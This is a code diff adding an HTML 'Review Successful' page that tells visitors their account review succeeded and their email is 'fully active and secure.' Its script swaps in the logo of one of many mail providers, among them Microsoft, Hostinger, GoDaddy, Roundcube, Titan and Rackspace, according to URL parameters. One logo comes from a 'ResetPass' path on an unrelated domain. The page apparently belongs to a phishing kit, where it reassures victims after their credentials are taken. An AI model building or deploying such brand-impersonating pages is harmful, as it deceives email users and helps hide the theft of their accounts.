@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Review Successful</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f8fb;
+        margin: 0;
+        padding: 0;
+      }
+
+      .container {
+        max-width: 600px;
+        margin: 80px auto;
+        background-color: #ffffff;
+        padding: 40px;
+        box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
+        border-radius: 8px;
+        text-align: center;
+      }
+
+      .logo {
+        margin-top: 30px;
+        margin-bottom: 50px;
+      }
+
+      .logo img {
+        max-height: 80px;
+      }
+
+      .checkmark {
+        font-size: 60px;
+        color: #28a745;
+      }
+
+      h1 {
+        font-size: 28px;
+        color: #333;
+        margin-bottom: 20px;
+      }
+
+      p {
+        font-size: 16px;
+        color: #555;
+        margin-bottom: 25px;
+      }
+
+      a.button {
+        display: inline-block;
+        padding: 12px 24px;
+        background-color: #007bff;
+        color: white;
+        text-decoration: none;
+        border-radius: 5px;
+        font-weight: bold;
+
+        text-decoration: none;
+        background-color: #24273d;
+        color: #fff;
+        padding: 15px 15px 15px 15px;
+        font-size: 20px;
+      }
+
+      a.button:hover {
+        background-color: #0056b3;
+      }
+
+      .footer {
+        margin-top: 40px;
+        font-size: 13px;
+        color: #888;
+      }
+
+      .footer a {
+        color: #007bff;
+        text-decoration: none;
+      }
+
+      .footer a:hover {
+        text-decoration: underline;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <!-- Company Logo -->
+      <div class="logo">
+        <img id="logoImage" alt="Titan" src="" style="width: 150px" />
+      </div>
+      <h1><span id="hprefix"></span> Successful</h1>
+      <p>
+        Thank you for reviewing your account. Your email services are now fully
+        active and secure.
+      </p>
+      <!-- <a href="https://app.titan.email/mail/" class="button"
+        >Return to MailBox</a
+      > -->
+
+      <div class="footer">
+        Need help? Visit our <a href="#">Help Center</a> or
+        <a href="#">contact support</a>.
+      </div>
+    </div>
+    <script>
+      const pd = {
+        hostinger:
+          "https://mail.hostinger.com/skins/hostinger/images/logo.svg?s=1755004164",
+        godda: "./assets/godad.png",
+        roundcube:
+          "https://khanieteam.com/ResetPass/Server/assets/roundcube_assets/logo.svg",
+        titan: "https://resources.flockmail.com/web/titan_email_logo.svg",
+        webmail:
+          "https://webmail.themwl.org/unprotected/cpanel/images/webmail-logo.svg",
+        rack: "https://752f77aa107738c25d93-f083e9a6295a3f0714fa019ffdca65c3.ssl.cf1.rackcdn.com/newsroom/2020/logos/png/Rackspace_Technology_Logo_RGB_BLK.png",
+        out: "https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Microsoft_logo_%282012%29.svg/2560px-Microsoft_logo_%282012%29.svg.png",
+        "qiye-aliyun": "./assets/logo.png",
+        icoremail: "./assets/core-logo.png",
+        globalmail: "./assets/logogmail",
+      };
+
+      const hp = {
+        va: "Verify Account",
+        cp: "Change Password",
+      };
+
+      const logoImage = document.getElementById("logoImage");
+      const hprefix = document.getElementById("hprefix");
+      const params = new URLSearchParams(window.location.search);
+      const imageKey = params.get("y");
+      const header = params.get("z");
+
+      if (imageKey && pd[imageKey]) {
+        logoImage.src = pd[imageKey];
+        hprefix.innerText = hp[header];
+      } else {
+        logoImage.src =
+          "https://via.placeholder.com/400x300?text=No+Image+Found";
+      }
+    </script>
+  </body>
+</html>
